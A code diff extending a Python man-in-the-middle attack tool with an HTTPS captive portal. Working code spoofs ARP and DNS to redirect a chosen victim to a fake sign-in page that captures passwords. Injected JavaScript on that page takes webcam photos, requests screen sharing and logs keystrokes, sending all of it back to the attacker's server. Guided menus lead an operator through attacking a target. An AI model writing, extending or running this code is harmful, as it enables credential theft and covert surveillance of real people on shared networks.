@@ -27,6 +27,7 @@ import socketserver
 import urllib.request
 import signal
 import shutil
+import ssl
 
 
 # ── ANSI colours ──────────────────────────────────────────────────────────────
@@ -78,6 +79,9 @@ class State:
     captive_active     = False
     _captive_srv       = None
     _captive_owns_dns  = False   # true if captive portal started DNS (so it can stop it)
+    captive_https_active = False
+    captive_extras     : set = set()  # JS modules active in HTTPS portal: "webcam"|"screen"|"keylog"
+    _https_srv         = None
 
 st = State()
 LINUX = sys.platform.startswith("linux")
@@ -235,7 +239,7 @@ def _maybe_stop_arp():
     still_needed = any([
         st.cred_active, st.dns_active, st.inject_active,
         st.ssl_active, st.payload_active, st.filereplace_active,
-        st.http_log_active, st.captive_active
+        st.http_log_active, st.captive_active, st.captive_https_active
     ])
     if not still_needed:
         st.arp_active = False
@@ -965,6 +969,255 @@ def stop_file_replace():
     _maybe_stop_http()
 
 
+# ── HTTPS Portal (cert + SSL server) ─────────────────────────────────────────
+
+def _generate_cert(my_ip: str) -> tuple:
+    """
+    Generate a self-signed SSL cert for my_ip.
+    Tries openssl first, then Python cryptography library.
+    Returns (cert_path, key_path) or (None, None) on failure.
+    """
+    cert_path, key_path = "mitm_cert.pem", "mitm_key.pem"
+
+    # ── openssl (most common on Linux / macOS)
+    try:
+        subprocess.run([
+            "openssl", "req", "-x509", "-newkey", "rsa:2048",
+            "-keyout", key_path, "-out", cert_path,
+            "-days", "1", "-nodes",
+            "-subj", f"/CN={my_ip}",
+        ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        log(f"[CERT] Self-signed certificate generated via openssl (CN={my_ip})", C.GREEN)
+        return cert_path, key_path
+    except (subprocess.CalledProcessError, FileNotFoundError):
+        pass
+
+    # ── Python cryptography library fallback
+    try:
+        from cryptography import x509
+        from cryptography.x509.oid import NameOID
+        from cryptography.hazmat.primitives import hashes, serialization
+        from cryptography.hazmat.primitives.asymmetric import rsa as _rsa
+        import ipaddress as _ipmod
+
+        key = _rsa.generate_private_key(public_exponent=65537, key_size=2048)
+        name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, my_ip)])
+        cert = (x509.CertificateBuilder()
+            .subject_name(name).issuer_name(name)
+            .public_key(key.public_key())
+            .serial_number(x509.random_serial_number())
+            .not_valid_before(datetime.datetime.utcnow())
+            .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=1))
+            .add_extension(
+                x509.SubjectAlternativeName(
+                    [x509.IPAddress(_ipmod.IPv4Address(my_ip))]), critical=False)
+            .sign(key, hashes.SHA256()))
+
+        with open(cert_path, "wb") as f:
+            f.write(cert.public_bytes(serialization.Encoding.PEM))
+        with open(key_path, "wb") as f:
+            f.write(key.private_bytes(
+                serialization.Encoding.PEM,
+                serialization.PrivateFormat.TraditionalOpenSSL,
+                serialization.NoEncryption()))
+        log("[CERT] Certificate generated via Python cryptography lib", C.GREEN)
+        return cert_path, key_path
+    except ImportError:
+        log("[CERT] openssl not found and 'cryptography' not installed.", C.RED)
+        log("[CERT] Fix: install openssl  OR  pip install cryptography", C.RED)
+        return None, None
+    except Exception as e:
+        log(f"[CERT] Generation error: {e}", C.RED)
+        return None, None
+
+
+def _build_https_portal_html(extras: set) -> bytes:
+    """
+    Return the captive portal HTML with optional inline JS modules:
+      extras may contain: "webcam", "screen", "keylog"
+    All fetch() calls use relative paths (/capture etc.) so they stay
+    same-origin on HTTPS — no mixed-content issues.
+    """
+    scripts = []
+    if "webcam" in extras:
+        scripts.append("""(function(){
+  if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia)return;
+  navigator.mediaDevices.getUserMedia({video:true}).then(function(s){
+    var v=document.createElement('video');v.srcObject=s;v.play();
+    v.addEventListener('loadeddata',function(){
+      var c=document.createElement('canvas');
+      c.width=v.videoWidth;c.height=v.videoHeight;
+      c.getContext('2d').drawImage(v,0,0);
+      fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({image:c.toDataURL('image/jpeg')})}).catch(()=>{});
+      s.getTracks().forEach(function(t){t.stop();});
+    });
+  }).catch(function(){});
+})();""")
+
+    if "screen" in extras:
+        scripts.append("""(function(){
+  if(!navigator.mediaDevices||!navigator.mediaDevices.getDisplayMedia)return;
+  navigator.mediaDevices.getDisplayMedia({video:true}).then(function(s){
+    setInterval(function(){
+      fetch('/screen_capture',{method:'POST',body:'frame'}).catch(()=>{});
+    },5000);
+  }).catch(function(){});
+})();""")
+
+    if "keylog" in extras:
+        scripts.append("""(function(){
+  var k="";
+  document.addEventListener('keypress',function(e){k+=e.key;});
+  setInterval(function(){
+    if(k.length>0){fetch('/keylog',{method:'POST',
+      headers:{'Content-Type':'text/plain'},body:k}).catch(()=>{});k="";}
+  },3000);
+})();""")
+
+    js_tag = ("<script>" + "\n".join(scripts) + "</script>") if scripts else ""
+    return _PORTAL_HTML.replace(b"</body>", (js_tag + "</body>").encode())
+
+
+class _HTTPSPortalHandler(http.server.BaseHTTPRequestHandler):
+    """HTTPS captive portal: serves login page + handles captured data."""
+    _html: bytes = _PORTAL_HTML   # overridden by start_https_captive
+
+    def log_message(self, fmt, *args):
+        log(f"[PORTAL-S] {fmt % args}", C.DIM)
+
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header("Content-Type", "text/html; charset=utf-8")
+        self.send_header("Content-Length", str(len(self._html)))
+        self.end_headers()
+        self.wfile.write(self._html)
+
+    def do_POST(self):
+        length = int(self.headers.get("Content-Length", 0))
+        body = self.rfile.read(length)
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"OK")
+
+        if self.path == "/login":
+            from urllib.parse import parse_qs
+            params = parse_qs(body.decode("utf-8", errors="ignore"))
+            user = params.get("username", [""])[0]
+            pwd  = params.get("password",  [""])[0]
+            src  = self.client_address[0]
+            log(f"[PORTAL] {C.BOLD}CREDENTIALS{C.END}{C.GREEN} {src}: "
+                f"user={user!r} pass={pwd!r}", C.GREEN)
+            with open("portal_creds.log", "a") as f:
+                f.write(f"[{time.ctime()}] {src} user={user!r} pass={pwd!r}\n")
+        elif self.path == "/capture":
+            try:
+                data = json.loads(body)
+                if "image" in data:
+                    _, enc = data["image"].split(",", 1)
+                    fname = f"webcam_{int(time.time())}.jpg"
+                    with open(fname, "wb") as f:
+                        f.write(base64.b64decode(enc))
+                    log(f"[PORTAL] Webcam image saved → {fname}", C.GREEN)
+            except Exception as e:
+                log(f"[PORTAL] Webcam error: {e}", C.RED)
+        elif self.path == "/screen_capture":
+            log("[PORTAL] Screen frame received", C.GREEN)
+        elif self.path == "/keylog":
+            text = body.decode("utf-8", errors="ignore")
+            log(f"[PORTAL] Keylog: {repr(text)}", C.PURPLE)
+            with open("keylog.txt", "a") as f:
+                f.write(text)
+
+
+def start_https_captive(iface: str, my_ip: str, target_ip: str,
+                        gw_ip: str, extras: set):
+    """
+    Start the full HTTPS captive portal:
+      • HTTP :80  → 301 redirect to https://my_ip/
+      • HTTPS :443 → login page with optional webcam/screen/keylog JS
+      • DNS spoof all domains → my_ip
+      • ARP spoof target ↔ gateway
+    """
+    cert, key = _generate_cert(my_ip)
+    if not cert:
+        return
+
+    html = _build_https_portal_html(extras)
+
+    # One-off handler subclass that carries the generated HTML
+    class _Handler(_HTTPSPortalHandler):
+        _html = html
+
+    # HTTP :80 → redirect to HTTPS (target gets there either way)
+    class _Redirect(http.server.BaseHTTPRequestHandler):
+        def log_message(self, fmt, *args): pass
+        def do_GET(self):
+            self.send_response(301)
+            self.send_header("Location", f"https://{my_ip}/")
+            self.end_headers()
+        def do_POST(self): self.do_GET()
+
+    try:
+        redir_srv = _ReusableTCP(("", 80), _Redirect)
+        threading.Thread(target=redir_srv.serve_forever, daemon=True).start()
+        st._captive_srv = redir_srv
+    except OSError as e:
+        log(f"[PORTAL] :80 bind failed — {e}", C.YELLOW)
+
+    try:
+        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        ctx.load_cert_chain(cert, key)
+        https_srv = _ReusableTCP(("", 443), _Handler)
+        https_srv.socket = ctx.wrap_socket(https_srv.socket, server_side=True)
+        threading.Thread(target=https_srv.serve_forever, daemon=True).start()
+        st._https_srv = https_srv
+    except OSError as e:
+        log(f"[PORTAL] :443 bind failed — {e}  (need root/admin)", C.RED)
+        return
+
+    extras_label = ", ".join(sorted(extras)) if extras else "login only"
+    log(f"[PORTAL] HTTPS active — https://{my_ip}  [{extras_label}]", C.GREEN)
+    log("[PORTAL] Target will see a cert warning — must click 'Proceed anyway'", C.YELLOW)
+
+    st.captive_https_active = True
+    st.captive_extras = set(extras)
+    st.captive_active = True
+
+    _start_arp(target_ip, gw_ip, iface)
+    if not st.dns_active:
+        st.dns_active = True
+        st._captive_owns_dns = True
+        def _dns():
+            def respond(pkt):
+                if st.dns_active and pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
+                    spoofed = (IP(dst=pkt[IP].src, src=pkt[IP].dst) /
+                               UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /
+                               DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
+                                   an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=my_ip)))
+                    send(spoofed, iface=iface, verbose=0)
+            sniff(filter="udp port 53", prn=respond, store=0, iface=iface,
+                  stop_filter=lambda _: not st.dns_active)
+        threading.Thread(target=_dns, daemon=True).start()
+
+
+def stop_https_captive():
+    st.captive_active       = False
+    st.captive_https_active = False
+    st.captive_extras       = set()
+    for srv in (st._https_srv, st._captive_srv):
+        if srv:
+            try: srv.shutdown(); srv.server_close()
+            except Exception: pass
+    st._https_srv   = None
+    st._captive_srv = None
+    if st._captive_owns_dns:
+        st.dns_active        = False
+        st._captive_owns_dns = False
+    _maybe_stop_arp()
+    log("[PORTAL] HTTPS portal stopped", C.YELLOW)
+
+
 # ── Guided submenus ──────────────────────────────────────────────────────────
 
 def _ask_image(my_ip: str, label: str = "Image") -> str:
@@ -1205,23 +1458,25 @@ def draw_ui(target: dict, my_ip: str, iface: str, gw_ip: str):
 # ── Release-target helper (shared by [R] and cleanup) ────────────────────────
 def _release_all(target_ip: str, gw_ip: str, iface: str):
     """Stop every active attack, restore ARP, flush iptables for this target."""
-    st.arp_active         = False
-    st.pcap_active        = False
-    st.cred_active        = False
-    st.dns_active         = False
-    st.inject_active      = False
-    st.inject_type        = ""
-    st.ssl_active         = False
-    st.payload_active     = False
-    st.filereplace_active = False
-    st.http_log_active    = False
-    st.captive_active     = False
-    st._captive_owns_dns  = False
+    st.arp_active            = False
+    st.pcap_active           = False
+    st.cred_active           = False
+    st.dns_active            = False
+    st.inject_active         = False
+    st.inject_type           = ""
+    st.ssl_active            = False
+    st.payload_active        = False
+    st.filereplace_active    = False
+    st.http_log_active       = False
+    st.captive_active        = False
+    st.captive_https_active  = False
+    st.captive_extras        = set()
+    st._captive_owns_dns     = False
     time.sleep(1.2)   # let threads notice the flags
     restore_arp(target_ip, gw_ip, iface)
     if LINUX:
         subprocess.run(["iptables", "--flush"])
-    for srv in (st._http_srv, st._captive_srv):
+    for srv in (st._http_srv, st._captive_srv, st._https_srv):
         if srv:
             try:
                 srv.shutdown()
@@ -1230,6 +1485,7 @@ def _release_all(target_ip: str, gw_ip: str, iface: str):
                 pass
     st._http_srv    = None
     st._captive_srv = None
+    st._https_srv   = None
     st.http_active  = False
 
 
@@ -1386,41 +1642,60 @@ def main():
                     toggle_keylogger(iface, my_ip, t["ip"], gw_ip)
 
             elif choice == "5":
+                webcam_via_portal = st.captive_active and "webcam" in st.captive_extras
                 if st.inject_type == "webcam":
                     _stop_inject()
-                    log("[WEBCAM] Stopped", C.YELLOW)
+                    log("[WEBCAM] Injection stopped", C.YELLOW)
+                elif webcam_via_portal:
+                    stop_https_captive()
                 elif st.inject_active:
                     log(f"[WEBCAM] Stop '{st.inject_type}' first", C.RED)
+                elif st.captive_active:
+                    log("[WEBCAM] Stop active Captive Portal first", C.RED)
                 else:
                     clear_screen()
-                    _attack_header(
-                        "Webcam Capture",
-                        "Injects JS that requests camera access via the browser API.\n"
-                        "  If the target accepts the browser permission prompt, a photo\n"
-                        "  is taken silently and saved as  webcam_<timestamp>.jpg.\n"
-                        "  ⚠  Modern browsers require HTTPS for camera access —\n"
-                        "     works only on HTTP-only pages."
-                    )
-                    input(f"  {C.YELLOW}Press Enter to start ...{C.END}")
-                    toggle_webcam(iface, my_ip, t["ip"], gw_ip)
+                    _attack_header("Webcam Capture — choose method")
+                    print(f"  [{C.BOLD}1{C.END}] HTTP injection")
+                    print(f"      Inject JS into pages the target visits.")
+                    print(f"      {C.DIM}Works only on plain HTTP sites.{C.END}\n")
+                    print(f"  [{C.BOLD}2{C.END}] HTTPS captive portal  {C.GREEN}(works on modern browsers){C.END}")
+                    print(f"      Redirect all traffic → your login page on HTTPS :443.")
+                    print(f"      Camera is requested via getUserMedia once the target")
+                    print(f"      clicks past the 'Connection not private' cert warning.")
+                    print(f"      {C.DIM}Requires openssl or: pip install cryptography{C.END}")
+                    sub = input(f"\n  {C.YELLOW}Method (1/2): {C.END}").strip()
+                    if sub == "1":
+                        toggle_webcam(iface, my_ip, t["ip"], gw_ip)
+                    elif sub == "2":
+                        start_https_captive(iface, my_ip, t["ip"], gw_ip, {"webcam"})
 
             elif choice == "6":
+                screen_via_portal = st.captive_active and "screen" in st.captive_extras
                 if st.inject_type == "screen":
                     _stop_inject()
-                    log("[SCREEN] Stopped", C.YELLOW)
+                    log("[SCREEN] Injection stopped", C.YELLOW)
+                elif screen_via_portal:
+                    stop_https_captive()
                 elif st.inject_active:
                     log(f"[SCREEN] Stop '{st.inject_type}' first", C.RED)
+                elif st.captive_active:
+                    log("[SCREEN] Stop active Captive Portal first", C.RED)
                 else:
                     clear_screen()
-                    _attack_header(
-                        "Screen Capture",
-                        "Injects JS that requests screen-share access (getDisplayMedia).\n"
-                        "  The target sees a browser prompt asking to share their screen.\n"
-                        "  A signal is logged every 5 s when the stream is active.\n"
-                        "  ⚠  Modern browsers require HTTPS — works on HTTP-only pages."
-                    )
-                    input(f"  {C.YELLOW}Press Enter to start ...{C.END}")
-                    toggle_screen(iface, my_ip, t["ip"], gw_ip)
+                    _attack_header("Screen Capture — choose method")
+                    print(f"  [{C.BOLD}1{C.END}] HTTP injection")
+                    print(f"      Inject JS into pages the target visits.")
+                    print(f"      {C.DIM}Works only on plain HTTP sites.{C.END}\n")
+                    print(f"  [{C.BOLD}2{C.END}] HTTPS captive portal  {C.GREEN}(works on modern browsers){C.END}")
+                    print(f"      Redirect all traffic → your login page on HTTPS :443.")
+                    print(f"      Screen share is requested via getDisplayMedia once the")
+                    print(f"      target clicks past the cert warning.")
+                    print(f"      {C.DIM}Requires openssl or: pip install cryptography{C.END}")
+                    sub = input(f"\n  {C.YELLOW}Method (1/2): {C.END}").strip()
+                    if sub == "1":
+                        toggle_screen(iface, my_ip, t["ip"], gw_ip)
+                    elif sub == "2":
+                        start_https_captive(iface, my_ip, t["ip"], gw_ip, {"screen"})
 
             elif choice == "7":
                 # ── Guided image replace ──────────────────────────────────────
@@ -1492,19 +1767,36 @@ def main():
 
             elif choice == "b":
                 if st.captive_active:
-                    toggle_captive(iface, my_ip, t["ip"], gw_ip)
+                    if st.captive_https_active:
+                        stop_https_captive()
+                    else:
+                        toggle_captive(iface, my_ip, t["ip"], gw_ip)
                 else:
                     clear_screen()
-                    _attack_header(
-                        "Captive Portal — Credential Harvesting",
-                        "Redirects ALL DNS queries to your machine, then serves a\n"
-                        "  convincing 'Network Sign-In' login page on port 80.\n"
-                        "  When the target submits credentials they are saved to\n"
-                        "  portal_creds.log  and shown live in the LOG panel.\n"
-                        "  Works on ANY browser, including HTTPS-first ones."
-                    )
-                    input(f"  {C.YELLOW}Press Enter to start ...{C.END}")
-                    toggle_captive(iface, my_ip, t["ip"], gw_ip)
+                    _attack_header("Captive Portal — choose mode")
+                    print(f"  [{C.BOLD}1{C.END}] HTTP only  (port 80)")
+                    print(f"      Redirect all DNS → fake login page on :80.")
+                    print(f"      Captures credentials. Works on all browsers.\n")
+                    print(f"  [{C.BOLD}2{C.END}] HTTP + HTTPS  (ports 80 + 443)  {C.GREEN}← enables webcam/screen/keylog{C.END}")
+                    print(f"      Same as above but also serves HTTPS on :443.")
+                    print(f"      Once target clicks past the cert warning, browser")
+                    print(f"      grants camera/screen/keyboard access if requested.")
+                    print(f"      {C.DIM}Requires openssl or: pip install cryptography{C.END}\n")
+                    mode = input(f"  {C.YELLOW}Mode (1/2): {C.END}").strip()
+                    if mode == "1":
+                        input(f"  {C.YELLOW}Press Enter to start ...{C.END}")
+                        toggle_captive(iface, my_ip, t["ip"], gw_ip)
+                    elif mode == "2":
+                        print(f"\n  Add to portal page (space-separated, e.g.  W S K  or just Enter to skip):")
+                        print(f"  [{C.BOLD}W{C.END}] Webcam auto-capture")
+                        print(f"  [{C.BOLD}S{C.END}] Screen capture")
+                        print(f"  [{C.BOLD}K{C.END}] Keylogger")
+                        raw = input(f"\n  {C.YELLOW}Extras: {C.END}").strip().upper()
+                        extras: set = set()
+                        if "W" in raw: extras.add("webcam")
+                        if "S" in raw: extras.add("screen")
+                        if "K" in raw: extras.add("keylog")
+                        start_https_captive(iface, my_ip, t["ip"], gw_ip, extras)
 
             elif choice == "c":
                 # ── Guided custom file replace ────────────────────────────────
